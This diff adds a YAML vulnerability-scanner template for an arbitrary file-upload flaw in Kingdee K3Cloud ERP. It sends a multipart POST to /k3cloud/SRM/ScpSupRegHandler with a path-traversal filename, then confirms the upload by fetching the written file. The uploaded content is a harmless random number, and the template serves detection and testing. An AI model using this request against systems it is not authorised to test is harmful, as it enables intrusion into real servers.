@@ -1,0 +1,32 @@
+name: yaml-poc-kingdee-erp-file_upload-CT-949212
+binding: 6939a984-bd88-4ef0-942a-7ff39cf75c75
+detail:
+    author: ct-user
+    vulnerability:
+        id: eff4c35e-ee6c-4ef3-aa17-0debe079b983
+        level: critical
+    warning: File Upload
+transport: http
+set:
+    s1: randomInt(10000, 99999)
+    s2: randomLowercase(8)
+    rboundary: randomLowercase(8)
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /k3cloud/SRM/ScpSupRegHandler
+            headers:
+                Content-Type: multipart/form-data; boundary={{rboundary}}
+            body: "--{{rboundary}}\r\nContent-Disposition: form-data; name=\"dbId_v\"\r\n\r\n.\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"FID\"\r\n\r\n2022\r\n--{{rboundary}}\r\nContent-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/{{s2}}.txt\"\r\nContent-Type: text/plain\r\n\r\n{{s1}}\r\n\r\n--{{rboundary}}--"
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains("true")
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /k3cloud/uploadfiles/{{s2}}.txt
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(string(s1))
+expression: r1() && r2()
